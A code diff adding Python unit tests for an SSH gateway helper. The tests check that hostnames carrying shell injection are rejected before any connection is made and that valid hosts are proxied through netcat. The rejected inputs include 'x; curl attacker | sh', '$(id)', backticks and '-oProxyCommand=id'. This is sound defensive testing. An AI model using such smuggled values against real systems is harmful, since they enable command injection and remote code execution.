@@ -386,3 +386,49 @@ class SSHProxyCommandAllowlistTest(base.BaseTest):
         kwargs = mock_ssh_client.return_value.connect.call_args.kwargs
         self.assertFalse(kwargs['look_for_keys'])
         self.assertFalse(kwargs['allow_agent'])
+
+
+@mock.patch.object(egress, 'validate_host')
+@mock.patch.object(ssh_utils, '_cleanup')
+@mock.patch.object(ssh_utils, '_execute_command', return_value=(0, 'ok'))
+@mock.patch.object(ssh_utils, '_connect')
+@mock.patch('paramiko.SSHClient')
+class SSHProxiedHostTest(base.BaseTest):
+
+    def test_injection_rejected_before_gateway_connection(
+            self, mock_ssh_client, *_):
+        for host in ('x; curl attacker | sh', 'x$(id)', 'x`id`',
+                     'x\nid', 'x id', 'x|id', 'x&id', '-oProxyCommand=id',
+                     '-e/bin/sh', 'host.', '.host', 'host-', 'a..b', '_x',
+                     '[::1]', 'fe80::1%eth0', '', 'a' * 64, None):
+            self.assertRaises(
+                exc.ActionException,
+                ssh_utils.execute_command_via_gateway,
+                'ls', host, 'user', None, 'gateway'
+            )
+
+        mock_ssh_client.assert_not_called()
+
+    def test_valid_hosts_are_proxied(self, mock_ssh_client, *_):
+        exec_command = (mock_ssh_client.return_value.get_transport
+                        .return_value.open_session.return_value.exec_command)
+
+        for host in ('target', 'node-1.example.com', 'node_1', '10.0.0.1',
+                     '2001:db8::1', '::1', 'a' * 63):
+            exec_command.reset_mock()
+
+            ssh_utils.execute_command_via_gateway(
+                'ls', host, 'user', None, 'gateway'
+            )
+
+            exec_command.assert_called_once_with('nc %s 22' % host)
+
+    def test_validate_host_literal_rejects_long_hostname(self, *_):
+        host = '.'.join(['a' * 63] * 4)
+
+        self.assertEqual(255, len(host))
+        self.assertRaises(
+            exc.ActionException,
+            ssh_utils._validate_host_literal,
+            host
+        )
